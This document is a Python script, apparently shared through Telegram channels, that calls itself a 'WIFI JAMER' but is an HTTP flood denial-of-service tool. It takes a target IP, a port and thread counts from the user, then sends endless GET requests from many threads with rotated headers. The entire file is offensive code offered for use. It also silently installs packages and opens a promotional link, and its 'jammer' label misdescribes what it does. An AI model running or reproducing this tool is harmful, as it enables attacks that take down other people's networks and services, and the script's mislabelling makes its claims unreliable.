#!/usr/bin/python3
#!/coded/by/https://t.me/kingeyte
# PROJECT - WIFI JAMER v1
# UPDATE - 20/07/2024
# JOIN - https://t.me/+N86yxoXJZvEyNjY1


#----------[ IMPORT MODULES ]----------#

import smtplib,os,time,requests
import random,threading,socket
try:import rich
except:os.system('pip install rich')
try:import user_agent
except:os.system('pip install user_agent')
try:import pystyle
except:os.system("pip install pystyle")
from user_agent import generate_user_agent as uss
import pystyle;from pystyle import Colors, Colorate
from rich import print as attack
useragents = str(uss)

#----------[  ASSEST ]----------#

bold1='\033[1;37m\033[40m\033[1;41m'
bold2='\033[40m\033[00m'

def lnx():
    print(Colorate.Horizontal(Colors.red_to_white, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
    
ref=['http://www.bing.com/search?q=',
'https://www.yandex.com/yandsearch?text=',
'https://duckduckgo.com/?q=']

acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept-Encoding: gzip, deflate\r\n",
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept-Language: en-US,en;q=0.5\r\n"]

#-----------[ LMNx9 LOGO ]----------#

logo=("""██╗    ██╗██╗███████╗██╗         ██╗ █████╗ ███╗   ███╗
██║    ██║██║██╔════╝██║         ██║██╔══██╗████╗ ████║
██║ █╗ ██║██║█████╗  ██║         ██║███████║██╔████╔██║
██║███╗██║██║██╔══╝  ██║    ██   ██║██╔══██║██║╚██╔╝██║
╚███╔███╔╝██║██║     ██║    ╚█████╔╝██║  ██║██║ ╚═╝ ██║
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝
                                                        """)

#----------[ TBDF MAIN & ATTACK ]----------#

def Anonymous():
    os.system('clear')
    print(f"{bold1}  billa™  |  WIFI JAMER  |  v1.0  {bold2}")
    print(Colorate.Horizontal(Colors.black_to_red, logo));lnx()
    os.system('xdg-open you https://t.me/TEAMBDDARKFORSC')
    ip = input(Colorate.Horizontal(Colors.black_to_red, '\a🚫 TARGET WIFI IP : '))
    lnx()
    port = input(Colorate.Horizontal(Colors.black_to_red, '🚫 ENTER PORT : '))
    lnx()
    try:pack = int(input(Colorate.Horizontal(Colors.black_to_red, '🚫 THREAD P/s : ')));lnx()
    except ValueError:
        attack('\a\n[bold red]- Use Packet Per Second Only Number\'s')
        time.sleep(3);Anonymous()
    try:thread = int(input(Colorate.Horizontal(Colors.black_to_red, '🚫 THREAD 𝐀𝐌𝐎𝐔𝐍𝐓 : ')));lnx()
    except ValueError:
        attack('\n\a[bold red]- Use Thread Amount Only Number\'s')
        time.sleep(3);Anonymous()
    def start():
        global useragents, ref, acceptall
        hh = random._urandom(3016)
        xx = int(0)
        useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
        accept = random.choice(acceptall)
        reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
        content    = "Content-Type: application/x-www-form-urlencoded\r\n"
        length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
        target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
        main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(ip),int(port)))
                s.send(str.encode(main_req))
                for i in range(pack):
                    s.send(str.encode(main_req))
                xx += random.randint(0, int(pack))
                attack("[bold cyan]anonymouspro-Success [bold white]| [bold green]{0}[bold white]:[bold green]{1}[bold white] | [bold green]Thread[bold white]:[bold red]{2}".format(str(ip), int(port), xx))
            except:
                s.close()
                attack("[bold red]anonymousPro-Failed  [bold white]| [bold green]{0}[bold white]:[bold green]{1}[bold white] | [bold yellow]Thread[bold white]:[bold red]{2}".format(str(ip), int(port), xx))
    for x in range(thread):
        thred = threading.Thread(target=start)
        thred.start()

#----------[ CONTROL MENU ]----------#

if __name__ in '__main__':
    Anonymous()
